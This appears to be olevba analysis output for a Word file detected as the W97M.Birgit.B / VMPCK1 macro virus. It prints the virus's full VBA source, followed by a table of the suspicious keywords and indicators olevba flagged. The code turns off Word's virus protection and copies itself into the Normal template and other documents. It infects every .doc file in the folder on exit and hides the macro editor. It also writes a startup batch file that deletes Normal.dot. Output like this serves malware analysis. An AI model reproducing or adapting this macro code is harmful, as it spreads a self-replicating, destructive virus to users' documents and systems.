olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.dm-d03ac4c5d989bcce1d914dd12f7fad4caf5864f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.dm-d03ac4c5d989bcce1d914dd12f7fad4caf5864f5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ariel.bas 
in file: Virus.MSWord.VMPCK1.dm-d03ac4c5d989bcce1d914dd12f7fad4caf5864f5 - OLE stream: 'Macros/VBA/Ariel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Ariel()
    
On Error Resume Next

Randomize

If Month(Now()) = 1 And Day(Now()) = 24 Then
    MsgBox ("Say HAPPY BIRTHDAY TO SHANKAR")
    
End If

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.SavePropertiesPrompt = False
Options.ConfirmConversions = False

Application.VBE.ActiveVBProject.VBComponents("Ariel").Export "c:\Ariel.sys"
ActiveDocument.ReadOnlyRecommended = False
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Not infected", vbSystemModal
f16935 = u5803 & c7210 & Int(Rnd * 1509)
f9377 = u14754 & c17776 & k15060 & m14754
If Day(Now()) = 19 Then Call p4788
If Month(Now()) = 3 And Day(Now()) = 19 Then MsgBox "BIRGIT FOREVER", vbInformation, "Birthday Greeting!!!"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Doctor Rave"
    .Title = "W97M.Birgit.B"
    .Subject = "Birgit"
    .Comments = "You're infected with the W97M.Birgit.B Virus !!!"
    .Execute
End With
 f8250$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f8162 = u12951 & c2030 & Int(Rnd * 3893)
i47887995 = GetAttr(NormalTemplate.FullName)
If i47887995 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8250$)
If i47887995 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8250$)
If i47887995 = vbReadOnly Then GoTo fuckoff
If i47887995 = vbReadOnly + vbArchive Then GoTo fuckoff
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Ariel" Then Unit187799563813 = True
Next I
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Ariel" Then o0o63819 = True
Next I
If Unit187799563813 = True And o0o63819 = False Then Set p638179959 = NormalTemplate.VBProject.VBComponents
If Unit187799563813 = False And o0o63819 = True Then Set p638179959 = ActiveDocument.VBProject.VBComponents
p638179959.import "c:\Ariel.sys"
If Unit187799563813 = True And o0o63819 = False Then Shell ("label c: Infected"), 0
If Unit187799563813 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If o0o63819 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
            Call dhIconDisco("C:\autorun.inf")
'VMPCK v1.0c [SR-1 Compatable]
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "Infected", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call Ariel
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Ariel
End Sub
Sub FileClose()
    On Error Resume Next
    Call Ariel
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
f11162 = u7698 & c11555 & Int(Rnd * 3728)
Dialogs(wdDialogToolsOptions).Show
k2187 = m16884 & e13658
    Call Ariel
End Sub
Sub FileExit()
    On Error Resume Next
f7757 = u19016 & c6779 & k9310 & m19016
    Call Ariel
f9543 = u11958 & c10557 & Int(Rnd * 7751)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Ariel
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Ariel
End If
Loop
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
f12150 = u8114 & c13905 & Int(Rnd * 3994)
    Call Ariel
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Ariel
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Ariel
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Ariel
End If
Loop
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Ariel
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call Ariel
MsgBox "Word Basic Err =7"
k18504 = m6653 & e14048
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Ariel
MsgBox "Word Basic Err =7"
End Sub
Sub ViewVBCode()
    On Error Resume Next
k18160 = m7554 & e2873
    Call Ariel
MsgBox "Word Basic Err =7"
End Sub
Sub p4788()
    On Error Resume Next
f8967 = u3474 & c7903 & k6843 & m3474
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "il"
            .Replacement.Text = "li"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
f9133 = u10677 & c10684 & Int(Rnd * 4163)
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = "c:\progra~1\micros~1\templa~1\"
f6526 = u14521 & c17335 & Int(Rnd * 7920)
snag1$ = "c:\progra~1\micros~2\templa~1\"
f14501 = u14848 & c11089 & Int(Rnd * 8258)
Part2$ = "del "
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
Sub dhIconDisco(strFile As String)
Dim hFile As Long
On Error Resume Next
Randomize
f18727 = u16742 & c5435 & Int(Rnd * 8926)
Choice = Int(Rnd * 2)
k8534 = m12807 & e9975
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
f10751 = u6416 & c1682 & Int(Rnd * 140)
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$
    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
